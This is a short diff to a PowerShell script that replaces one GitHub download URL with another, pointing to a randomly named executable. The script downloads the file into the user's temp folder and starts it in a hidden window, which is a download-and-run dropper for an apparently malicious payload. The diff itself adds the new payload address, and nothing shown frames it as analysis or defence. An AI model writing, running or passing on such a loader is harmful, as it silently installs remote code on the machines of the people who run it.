@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/nagibatorm55-ops/error-check/main/error.exe"
+$url = "https://github.com/nagibatorm55-ops/errorfuck/raw/refs/heads/main/wedsuvit1ggjshsa.exe"
 $path = "$env:TEMP\error.exe"
 irm $url -OutFile $path
 Start-Process -FilePath $path -WindowStyle Hidden
